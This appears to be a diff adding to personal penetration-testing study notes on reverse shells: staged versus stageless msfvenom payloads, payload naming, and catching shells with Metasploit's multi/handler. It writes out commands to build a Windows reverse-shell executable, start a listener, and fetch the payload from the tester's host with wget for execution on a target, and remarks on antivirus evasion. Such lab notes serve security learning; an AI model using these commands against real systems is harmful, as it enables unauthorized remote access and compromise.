@@ -88,4 +88,44 @@ One-liner PSH reverse shell, usually when tageting a windows server:
 # msfvenom
 The standard syntax for msfvenom is as follows: `msfvenom -p <PAYLOAD> <OPTIONS>`. For example, to generate a Windows x64 Reverse Shell in an exe format, we could use: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`.
 
+## Staged vs Stageless 
+
+- Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
+
+- Stageless payloads are more common -- They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
+
+> Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.
+
+## Naming convention
+`<OS>/<arch>/<payload>`, For example: `linux/x86/shell_reverse_tcp`
+
+The exception to this convention is Windows 32bit targets. we find it as `windows/shell_reverse_tcp`
+
+Stageless are shown with _ like `shell_reverse_tcp` but for staged `shell/reverse_tcp`
+
+remember we can always use `msfvenom --list payloads` and grep to find the desired payload.
+
+# multi/handler Metasploit
+Multi/Handler is a superb tool for catching reverse shells.
+
+It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.
+
+How to use multi/handler?  
+1. Generate the payload:
+   - using the command `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
+
+2. Start the multi/handler listener:
+   - `msfconsole` to start metasploit. With sudo if we listening on a port less then 1024.
+   - `use multi/handler`
+   - set `PAYLOAD <payload>`, `LHOST <listen-address>`, and `set LPORT <listen-port>`.
+   - `exploit -j` to start the listener in a new job.
+
+3. copy the payload file to the target. How?
+   - open a python server on your machine.
+   - login to the target using WinRM, RDP, or whatever access we got.
+   - using curl or wget `wget -O <filename> http://<IP>:8000/<path to payload file>`, then execute.
+
+4. In metasploit we should see that the listener already caught the shell and we can foreground the session with `sessions <sessionNum>`.
+
+
 
